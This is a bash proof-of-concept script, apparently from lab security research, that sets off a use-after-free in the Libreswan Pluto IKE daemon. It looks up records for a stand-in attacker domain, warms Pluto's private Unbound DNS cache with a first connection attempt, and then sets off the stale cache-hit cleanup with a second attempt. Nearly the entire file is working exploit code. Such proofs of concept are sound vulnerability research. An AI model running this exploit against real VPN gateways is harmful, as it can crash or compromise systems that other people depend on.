#!/usr/bin/env bash
# Run on VM2. Attempt 1 warms Pluto's private Unbound cache; attempt 2 triggers
# the synchronous cache-hit cleanup UAF.

set -uo pipefail
PATH=/usr/sbin:/usr/bin:/sbin:/bin

if [[ ${EUID} -ne 0 ]]; then
	echo "run as root: sudo $0 [settle-seconds]" >&2
	exit 2
fi

settle=${1:-2}
case ${settle} in
	''|*[!0-9]*)
		echo "settle-seconds must be a non-negative integer" >&2
		exit 2
		;;
esac

connection=uaf2-ipseckey
log=/tmp/uaf2-trigger.log
dns_server=${DNS_SERVER:-127.0.0.1}
: > "${log}"

run_attempt()
{
	local number=$1
	echo "===== attempt ${number} at $(date --iso-8601=seconds) =====" | tee -a "${log}"
	timeout 20 ipsec auto --up "${connection}" 2>&1 | tee -a "${log}"
	local rc=${PIPESTATUS[0]}
	echo "attempt ${number} exit=${rc}" | tee -a "${log}"
	return 0
}

echo "DNS records visible from VM2:" | tee -a "${log}"
dig +short @"${dns_server}" attacker.uaf2-poc.net A | tee -a "${log}"
dig +short @"${dns_server}" attacker.uaf2-poc.net IPSECKEY | tee -a "${log}"

echo | tee -a "${log}"
echo "Attempt 1 should issue asynchronous DNS queries and warm VM1 Pluto's private cache." | tee -a "${log}"
systemctl restart ipsec
ipsec whack --impair suppress_retransmits >/dev/null 2>&1 || true
run_attempt 1

echo "waiting ${settle}s for both DNS callbacks to finish" | tee -a "${log}"
sleep "${settle}"

echo | tee -a "${log}"
echo "Attempt 2 should receive synchronous cache hits and trigger the stale cleanup." | tee -a "${log}"
systemctl restart ipsec
ipsec whack --impair suppress_retransmits >/dev/null 2>&1 || true
run_attempt 2

echo | tee -a "${log}"
echo "Trigger complete. Check VM1:" | tee -a "${log}"
echo "  pgrep -a -x pluto" | tee -a "${log}"
